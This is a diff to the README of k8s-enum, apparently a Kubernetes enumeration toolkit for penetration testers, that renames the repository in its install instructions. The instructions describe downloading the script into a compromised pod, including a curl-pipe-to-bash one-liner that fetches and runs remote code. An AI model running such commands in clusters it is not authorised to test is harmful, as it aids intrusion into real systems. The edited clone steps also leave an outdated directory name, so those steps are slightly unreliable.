@@ -1,4 +1,4 @@
-# K8s-Enum 
+# k8s-enum.sh 
 
 <p align="center">
   <img src="https://img.shields.io/badge/Platform-Kubernetes-326CE5?style=for-the-badge&logo=kubernetes&logoColor=white" alt="Kubernetes">
@@ -16,7 +16,7 @@
 <img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/f33eca99-e27e-4a22-b84a-9f100dd8c580" />
 
 
-## 🎯 What is K8s-Enum?
+## 🎯 What is k8s-enum.sh?
 
 **k8s-enum** is a set of Kubernetes security enumeration scripts designed for penetration testers, red teamers, and security researchers. Inspired by [LinPEAS](https://github.com/carlospolop/PEASS-ng), these tools provide comprehensive enumeration with color-coded output highlighting privilege escalation vectors and misconfigurations.
 
@@ -52,7 +52,7 @@ Use this when you've compromised a container/pod and want to enumerate your Kube
 
 ```bash
 # Clone the repository
-git clone https://github.com/ahrixia/k8s-enum.git
+git clone https://github.com/ahrixia/k8s-enum.sh.git
 cd k8s-enum
 
 # Make executable
@@ -72,12 +72,12 @@ chmod +x k8s-enum.sh
 
 ```bash
 # Download directly into compromised pod
-curl -O https://raw.githubusercontent.com/ahrixia/k8s-enum/main/k8s-pod-enum.sh
+curl -O https://raw.githubusercontent.com/ahrixia/k8s-enum.sh/main/k8s-pod-enum.sh
 chmod +x k8s-pod-enum.sh
 ./k8s-pod-enum.sh
 
 # Or one-liner
-curl -sL https://raw.githubusercontent.com/ahrixia/k8s-enum/main/k8s-pod-enum.sh | bash
+curl -sL https://raw.githubusercontent.com/ahrixia/k8s-enum.sh/main/k8s-pod-enum.sh | bash
 ```
 
 ---
